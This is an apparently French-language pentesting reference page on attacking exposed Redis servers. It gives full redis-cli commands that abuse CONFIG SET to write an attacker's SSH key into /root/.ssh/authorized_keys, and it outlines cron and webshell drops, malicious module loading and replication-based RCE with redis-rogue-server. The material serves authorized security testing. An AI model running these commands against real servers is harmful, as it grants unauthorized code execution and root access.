---
title: "Redis"
order: 5
description: "La surface offensive de Redis atteint en tant que service : accès non authentifié par défaut, et les voies d'écriture de fichier et de chargement de module qui le transforment en exécution de code, des dépôts d'authorized_keys et de cron aux modules malveillants et au RCE basé sur la réplication."
keywords:
  - Redis
  - unauthenticated
  - CONFIG SET
  - MODULE LOAD
  - replication RCE
---

# Redis

Redis (port 6379) est livré **sans authentification** et, historiquement, écoutait sur toutes les interfaces, donc une instance exposée constitue souvent un point d'ancrage non authentifié. Son véritable danger est que `CONFIG SET` permet à un client de **choisir où le fichier de base de données est écrit**, ce qui transforme Redis en une primitive d'écriture de fichier arbitraire, et de là en exécution de code.

## Accès

```bash
redis-cli -h <target>              # connect; INFO and KEYS * if no auth
redis-cli -h <target> -a <pass>    # where requirepass is set (crack weak ones)
```

## Écriture de fichier vers l'exécution de code

Pointez le fichier RDB vers un emplacement sensible et écrivez une charge utile en tant que valeur de clé. Sur Redis actuel, le `CONFIG SET` à l'exécution de `dir`/`dbfilename` est bloqué à moins que le serveur n'ait été démarré avec `enable-protected-configs yes`, donc il s'agit avant tout d'une technique applicable aux serveurs anciens ou mal configurés :

```bash
# SSH: write an authorized_keys file into a user's .ssh
redis-cli -h <target> config set dir /root/.ssh/
redis-cli -h <target> config set dbfilename authorized_keys
redis-cli -h <target> set k "$(printf '\n\n%s\n\n' "$(cat id_rsa.pub)")"
redis-cli -h <target> save

# Cron: write a job into /var/spool/cron (Linux) for a callback
# Web: write a webshell into a served directory when Redis and the web root share a host
```

## Chargement de module et RCE par réplication

```bash
# Load a malicious module for direct command execution (Redis 4.0+;
# current servers require enable-module-command yes at startup for MODULE LOAD)
redis-cli -h <target> module load /path/to/exp.so

# Replication RCE: make the target a replica of an attacker "master" that ships a module
# tools: redis-rogue-server / RedisModules-ExecuteCommand
```

## Notes d'exploitation

- Redis non authentifié exposé au réseau est l'élément marquant : aucun identifiant nécessaire avant la chaîne d'écriture de fichier.
- Les dépôts d'**authorized_keys** et de **cron** dépendent des privilèges du compte de service Redis (Redis en root est le jackpot) et du fait que le répertoire soit inscriptible.
- Le RCE par **chargement de module** et **réplication** constitue les voies les plus propres là où le chargement de module est autorisé (`enable-module-command yes`), donnant une exécution directe de commandes sans dépendre d'un `.ssh` ou d'un cron inscriptible.
- Le `protected-mode` (activé par défaut depuis la 3.2 lorsqu'aucun bind/mot de passe n'est défini) bloque bon nombre de ces techniques depuis l'extérieur, donc confirmez qu'il est désactivé ou contourné.

## Outils

- **redis-cli** : client natif pour `CONFIG SET`, `MODULE LOAD` et la chaîne d'écriture de fichier.
- **redis-rogue-server** : RCE par module basé sur la réplication contre Redis 4.0+.
- **nmap `redis-info`** : empreinte non authentifiée.

## Références

- [HackTricks: pentesting Redis (6379)](https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)
- [Redis: security and protected-mode](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)
- [redis-rogue-server (n0b0dyCN)](https://github.com/n0b0dyCN/redis-rogue-server)
